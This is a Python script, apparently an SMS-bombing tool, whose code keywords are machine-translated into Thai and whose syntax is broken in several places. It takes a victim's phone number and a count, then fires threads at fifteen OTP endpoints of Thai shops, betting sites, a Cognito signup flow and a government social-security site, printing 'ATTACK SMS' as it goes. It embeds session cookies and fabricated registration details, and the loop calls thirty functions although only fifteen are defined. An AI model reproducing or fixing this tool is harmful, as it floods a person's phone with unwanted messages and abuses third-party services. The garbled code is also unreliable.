คำขอนำเข้า
 เวลานำเข้า
นำเข้า เกลียว
จาก การทำเกลียว นำเข้า Thread
พิมพ์ ( "" )
print ( " ไก่ทอง")
พิมพ์ ( "" )
phone  =  input ( "เบอร์ : " )
NUM  =  int ( อินพุต ( "จำนวน: " ))

พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺...." )
พิมพ์ ( "" )

def  api ():
	คำขอ _ โพสต์ ( "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp" , data = { "mobile_phone_no" : phone })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : LOTUSS" )

def  api2 ():
	คำขอ _ โพสต์ ( "https://www.aurora.co.th/signin/otp_chk" , data = f"mobile= { phone } &type_otp=3" )
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : เจสัน" )

def  api3 ():
	คำขอ _ โพสต์ ( "https://tamjaibet.com/api/request/otp" , ข้อมูล= { "PhoneNumber" : "0" + โทรศัพท์ , "เข็ม" : "HFdjc3ZU4WAnxLQQcCWB0TWV9zPCdpWmFpCUApNUtwAENbCGJkEAR9ckcdc20XMFR8HVQhEkREXwIOcDwnKRl1LDpXaQMJYB8ZSBQzZRdpem4YF3VHST0BYVQTU1NEcQATSSgpOnY3ZS9ZAFw3WSZXASwecS4LZD5wWhRicklxFQ1cFVAiczQOYxYSfUkaTD1sSSFTZU0mRDoZciRkEHV9dTE" })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : MOVDIER" )

def  api4 ():
	คำขอ _ โพสต์ ( "https://store.boots.co.th/api/v1/guest/register/otp-challenge" , json = { "phone_number" : "+66" + phone })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : BOOT" )

def  api5 ():
	คำขอ _ post ( "https://www.carsome.co.th/website/login/sendSMS" , json = { "username" : "phone" , "optType" : 0 })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : PYTHON2" )

def  api6 ():
	คำขอ _ โพสต์ ( "https://gamingnation.dtac.co.th/api/otp/generate" , json = { "template" : "register" , "phone_no" : "phone" })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : OTP " )

def  api7 ():
	คำขอ _ โพสต์ ( "https://cognito-idp.ap-southeast-1.amazonaws.com/" , headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML เช่น Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36" , "content-type" : "application/x-amz-json-1.1" , "x-amz-target" : "AWSCognitoIdentityProviderService.SignUp" , "x- amz-user-agent" : "aws-amplify/0.1.x js" , "ผู้อ้างอิง" : "https://www.bugaboo.tv/members/signup/phone""ClientId" : "6g47av6ddfcvi06v4l186c16d6" , "Username" : f"+66 { phone [ 1 :] } " , "Password" : "098098Az" , "UserAttributes" :[{ "Name" : "name" , "Value" : "Dbdh" },{ "Name" : "birthdate " , "Value" : "2005-01-01" },{ "Name" : "gender" ,"ค่า" : "ชาย" },{ "ชื่อ" :"phone_number" , "Value" : f"+66 { phone [ 1 :] } " },{ "Name" : "custom:phone_country_code" , "Value" : "+66" },{ "Name" : "กำหนดเอง :is_agreement" , "Value" : "true" },{ "Name" : "custom:allow_consent" , "Value" : "true" },{ "Name" : "custom:allow_person_info", "ค่า" : "จริง" }], "ValidationData":[]})
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : NODE" )

def  api8 ():
	คำขอ _ โพสต์ ( "https://cognito-idp.ap-southeast-1.amazonaws.com/"ส่วนหัว= { "cache-control" : "max-age=0" , "user-agent" : "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML เช่น Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36" , "content-type" : "application/x-amz-json-1.1" , "x- amz-target" : "AWSCognitoIdentityProviderService.ResendConfirmationCode" , "x-amz-user-agent" : "aws-amplify/0.1.x js" ,"https://www.bugaboo.tv/members/resetpass/phone" }, json = { "ClientId" : "6g47av6ddfcvi06v4l186c16d6" , "Username" : f"+66 { phone [ 1 :] } " })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : PYTHON" )

def  api9 ():
	คำขอ _ โพสต์ ( "https://api.scg-id.com/api/otp/send_otp"ส่วนหัว= { "ประเภทเนื้อหา" : "application/json;charset=UTF-8" }, json = { "phone_no" : โทรศัพท์ })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : JAVA" )

def  api10 ():
	คำขอ _ โพสต์ ( "https://ep789bet.net/auth/send_otp" , data = { "โทรศัพท์" : โทรศัพท์ })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : C" )

def  api11 ():
	คำขอ _ โพสต์ ( "http://b226.com/x/code" , data = { f"phone" : phone })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : C+" )

def  api12 ():
	คำขอ _ โพสต์ ( "https://www.msport1688.com/auth/send_otp" , data = { "โทรศัพท์" : โทรศัพท์ })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : HTML" )

def  api13 ():
	คำขอ _ รับ ( "https://m.redbus.id/api/getOtp?number=" + โทรศัพท์ [ 1 :] + "&cc=66&whatsAppOpted=true"ส่วนหัว= { "traceparent" : "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01 " , "user-agent" : "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML เช่น Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36" }) ข้อความ
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : PHP" )

def  api14 ():
	คำขอ _ โพสต์ ( "https://www.msport1688.com/auth/send_otp" , data = { "โทรศัพท์" : โทรศัพท์ })
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : MC∆T" )

def  api15 ():
	คำขอ _ โพสต์ ( 'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp'ส่วนหัว = { "User-Agent" : "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 ( KHTML เช่น Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36" , "Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8" , "X-Requested-With" : "XMLHttpRequest " , "คุกกี้" :"sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"}, data = f"dCard=1358231116147&Mobile= { phone } &password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=40 gmaidtype "
	พิมพ์ ( "𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑴𝑺 : END" )



สำหรับ ฉัน อยู่ใน ช่วง ( NUM ):
	เกลียว _ เธรด ( เป้าหมาย= api ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api2 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api3 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api4 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api5 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api6 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api7 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api8 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api9 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api10 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api11 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api12 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api13 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api14 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api15 ) เริ่ม () 
	เกลียว _ เธรด ( เป้าหมาย= api16 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api17 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api18) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api19 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api20) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api21) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api22) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api23 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api24 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api 25) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api26 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api27 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api28 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api29 ) เริ่ม ()
	เกลียว _ เธรด ( เป้าหมาย= api30 ) เริ่ม () 
